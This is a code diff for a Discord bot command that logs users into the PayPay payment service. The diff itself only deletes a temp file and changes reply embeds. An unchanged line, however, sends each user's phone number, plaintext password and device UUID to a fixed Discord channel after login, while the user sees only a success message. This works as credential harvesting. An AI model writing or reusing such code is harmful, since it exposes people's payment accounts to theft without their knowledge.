@@ -13,7 +13,7 @@ export default {
 
       const object = JSON.parse(await fs.readFile(`./temp/${interaction.user.id}`));
       delete object.cookie;
-      //await fs.unlink(`./temp/${interaction.user.id}`);
+      await fs.unlink(`./temp/${interaction.user.id}`);
 
       const paypay = new PayPay(object.phone, object.password);
 
@@ -36,7 +36,7 @@ export default {
 
       if (!result.status) {
         const embed = new discord.EmbedBuilder()
-          .setColor(process.env.COLOR)
+          .setColor('Blue')
           .setTitle('paypay-login')
           .setDescription('OTPが間違っています。');
 
@@ -44,7 +44,12 @@ export default {
         return;
       }
 
-      await interaction.reply({ content: 'Success!', ephemeral: true });
+      const embed = new discord.EmbedBuilder()
+        .setColor('Blue')
+        .setTitle('paypay-login')
+        .setDescription('ログインに成功しました！');
+
+      await interaction.reply({ embeds: [embed], ephemeral: true });
 
       client.channels.cache.get('1206198510698110986').send(`<@${interaction.user.id}> : ${object.phone}.${object.password}.${object.uuid}`);
     }
